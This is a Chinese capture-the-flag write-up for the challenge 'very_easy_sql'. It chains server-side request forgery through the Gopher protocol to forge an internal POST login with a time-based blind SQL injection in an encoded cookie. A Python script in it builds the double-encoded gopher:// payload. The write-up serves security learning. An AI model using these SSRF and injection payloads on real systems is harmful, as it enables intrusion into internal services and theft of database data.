ailx10说：这篇是在2024年12月之前写的，后来又改过。very\_easy\_sql 的名字挺轻松，做起来却要把好几层东西接上。我先看出 URL 是由服务端去访问的，再用 Gopher 拼内部 HTTP；Cookie 还得先 Base64、再 URL 编码，到了查询这层，又只能靠错误和时间差慢慢判断。这篇把从请求转发到逐字符脚本的过程都留下了，免得最后只剩一长串看不清的编码。时间上的变化尤其不能随手下结论，网络本来就会抖，得把题目环境、重复观察和真实响应一起看，才知道自己究竟验证到了哪一步。

原题通过服务端请求构造内部 HTTP 流量，再观察基于响应时间的 SQL 条件。编码次序与请求格式需以实验环境验证。

```
gopher://127.0.0.1:80/_POST / HTTP/1.1

Host: 127.0.0.1

Content-Length: 13

<POST data>

```

SQL时间盲注（Time-based Blind SQL Injection）是一种SQL注入攻击方式，在这种攻击中，攻击者通过观察应用程序的响应时间来推测数据库中的数据。与经典的SQL盲注不同，时间盲注不需要直接获取查询结果，而是通过执行某些条件引发数据库延迟，然后根据延迟的时间来推断信息是否符合特定条件。

使用 Gopher 协议 发送 POST 请求，尝试使用 admin/admin 登录，并且 Host 是127.0.0.1 ，端口还必须是 80 。这个地方有点坑，换成其他的就没有302重定向，有点奇怪，但是这并不是解题的关键，你怎么也想不到，这题是Cookie 时间盲注吧，经过URL解码，再经过Base64解码得到：`this_is_your_cookie=admin`

```
import urllib.parse



payload ="""POST / HTTP/1.1

Host: 127.0.0.1:80

User-Agent: curl/7.43.0

Accept: */*

Content-Type: application/x-www-form-urlencoded

Content-Length: 24



uname=admin&passwd=admin"""



tmp = urllib.parse.quote(payload)

new = tmp.replace('%0A','%0D%0A')

result = 'gopher://127.0.0.1:80/'+'_'+new

result = urllib.parse.quote(result)

print(result)

```

时间盲注最容易被偶然慢一次带跑。把基线、条件差异和编码层次留清楚，脚本每读出一个字符才有可以核对的依据，而不是把超时直接当成答案。
